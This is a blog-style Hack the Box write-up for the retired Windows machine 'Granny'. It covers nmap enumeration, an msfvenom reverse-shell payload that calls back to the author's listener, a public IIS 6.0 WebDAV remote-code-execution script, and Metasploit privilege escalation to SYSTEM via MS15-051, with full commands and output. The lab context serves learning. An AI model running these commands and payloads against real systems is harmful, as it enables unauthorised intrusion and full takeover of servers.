---
layout: post
title: Hack the Box - Granny
date: 2020-04-15 19:31:22 +0100
description: Granny, while similar to Grandpa, can be exploited using several different methods. The intended method of solving this machine is the widely-known Webdav upload vulnerability.
img: granny.png
fig-caption: Granny
categories: HackTheBox
tags: [Easy, Windows, Retired, CVE]
---
## Overview
Granny, while similar to Grandpa, can be exploited using several different methods. The intended method of solving this machine is the widely-known Webdav upload vulnerability.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/granny]
└─$ sudo nmap -p- -T4  10.129.113.122 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 20:25 GMT
Nmap scan report for 10.129.113.122
Host is up (0.017s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http
```
From the port scan only one port was open, being port 80.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/granny]
└─$ sudo nmap -p80 --script vuln  10.129.113.122
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 20:39 GMT
Nmap scan report for 10.129.113.122
Host is up (0.017s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /_vti_bin/: Frontpage file or folder
|   /_vti_log/: Frontpage file or folder
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /_vti_bin/shtml.dll: Frontpage file or folder
|   /_vti_bin/shtml.exe: Frontpage file or folder
|   /images/: Potentially interesting folder
|_  /_private/: Potentially interesting folder
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|       
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
```
Initially the vulnerability scan led me down a bit of a rabbit hole with the anonymous login extension being flagged as vulnerable. However after attempting to exploit FrontPage and coming back empty handed I attempted service enumeration.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/granny]
└─$ sudo nmap -p80 -A  10.129.113.122
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 21:13 GMT
Nmap scan report for 10.129.113.122
Host is up (0.017s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Sun, 14 Mar 2021 21:13:55 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
```
After discovering the web server version a google returns that this version is vulnerable to a RCE vulnerability. In an attempt to not use metasploit I found a python script that can exploit this vulnerability [ExplodingCan](https://github.com/danigargu/explodingcan)
## Foothold
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/granny]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -f raw  -e x86/alpha_mixed LHOST=10.10.14.27 LPORT=4448 > shellcode 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 770 (iteration=0)
x86/alpha_mixed chosen with final size 770
Payload size: 770 bytes
                                                                                                                                                                                                                                     
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/granny]
└─$ python 41738.py http://10.129.113.122/ shellcode                                                               
[*] Using URL: http://10.129.113.122/
[*] Server found: Microsoft-IIS/6.0
[*] Found IIS path size: 18
[*] Default IIS path: C:\Inetpub\wwwroot
[*] WebDAV request: OK
[*] Payload len: 2291
[*] Sending payload...
[*] Socket timeout
[+] The host is maybe vulnerable
```
Having generated the payload and sent it off using the script, as long as there is a metasploit listener it should receive the reverse shell.
```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.27:4448 
[*] Sending stage (175174 bytes) to 10.129.113.122
[*] Meterpreter session 1 opened (10.10.14.27:4448 -> 10.129.113.122:1038) at 2021-03-14 21:43:58 +0000
```
## Privilege Escalation
Once we receive the shell we have the network service system user, after we enumerate local exploits using the local_exploit_suggester in metasploit we find a successful exploit as shown below.
```
msf6 exploit(windows/local/ms15_051_client_copy_image) > exploit

[*] Started reverse TCP handler on 10.10.14.27:5555 
[*] Launching notepad to host the exploit...
[+] Process 3036 launched.
[*] Reflectively injecting the exploit DLL into 3036...
[*] Injecting exploit into 3036...
[*] Exploit injected. Injecting payload into 3036...
[*] Payload injected. Executing exploit...
[*] Sending stage (175174 bytes) to 10.129.113.122
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 2 opened (10.10.14.27:5555 -> 10.129.113.122:1039) at 2021-03-14 21:52:37 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```